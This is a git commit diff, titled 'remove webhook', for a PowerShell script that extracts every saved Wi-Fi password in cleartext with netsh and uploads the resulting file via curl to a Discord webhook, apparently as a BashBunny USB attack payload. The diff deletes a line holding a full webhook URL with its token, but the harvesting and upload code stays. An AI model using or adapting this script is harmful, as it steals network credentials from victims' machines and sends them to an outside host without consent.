5f2654851b8d6c3b1a9aaf1e96876467365d3e75
Nate Glaser <nate@wolf-paw.net>
2022-04-14 15:45:42 -0400

    remove webhook

--- show-all-saved-wifi-passwords-discord.ps1
+++ show-all-saved-wifi-passwords-discord.ps1
@@ -1,5 +1,4 @@
 (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize  >> asdf2.txt
-$WEBHOOK_URL = "https://discord.com/api/webhooks/963840591622455386/k0EAK4lgAPmMyupPhp3Yp0PYR7NZJSLFre3fV_cXlfPvhux0Y43iNTSDq3QwqymbFTUx"
 curl `
   -F "payload_json={\"content\": \"Platform:\tBashBunny\nTarget:\t\tGalifrey\nOS:\t\t\t  $osx\"}" `
   -F "file1=@asdf2.txt" `
